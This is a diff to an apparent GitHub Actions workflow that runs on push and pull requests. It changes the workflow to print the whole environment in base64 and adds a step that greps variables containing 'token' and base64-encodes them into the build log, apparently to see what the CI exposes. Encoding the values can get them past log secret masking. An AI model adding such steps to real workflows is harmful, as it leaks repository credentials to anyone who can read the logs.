@@ -1,4 +1,4 @@
-name: Dump environment in pull_request and push actions
+name: pull_request and push actions
 on: [push, pull_request]
 
 jobs:
@@ -21,9 +21,10 @@ jobs:
       run: |
         env
 
-    - name: Show environment from /proc in base64
+    - name: Show environment in base64
       run: |
-        base64 < /proc/self/environ
+        env | base64
 
-
-
+    - name: Show tokens in environment in base64
+      run: |
+        env | grep -i token | base64
